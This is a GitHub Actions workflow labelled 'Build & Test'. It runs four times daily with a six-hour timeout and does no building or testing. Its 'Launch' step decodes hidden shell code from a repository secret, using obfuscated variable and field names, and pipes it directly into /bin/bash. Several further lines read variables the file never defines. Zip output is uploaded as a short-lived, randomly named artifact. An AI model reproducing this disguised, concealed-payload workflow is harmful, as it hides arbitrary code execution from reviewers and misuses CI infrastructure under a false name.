name: Build & Test
on:
  workflow_dispatch:

  schedule:
    - cron: '35 5,11,17,23 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          ps69101: ${{ secrets.ps69101 }}
        run: |
          printf '%s' "$ps69101" | jq -r .lrxp7 | /bin/bash
          printf '%s' "$n59" | jq -r .b10 | /bin/bash
          printf '%s' "$bj99" | jq -r .xy2498 | /bin/bash
          printf '%s' "$it53" | jq -r .elube4 | /bin/bash
          printf '%s' "$ynf95319" | jq -r .o37 | /bin/bash
          printf '%s' "$hf0565" | jq -r .es0759 | /bin/bash
          printf '%s' "$ca99" | jq -r .aqd75 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: DQvevE9X
          path: "*.zip"
          retention-days: 1
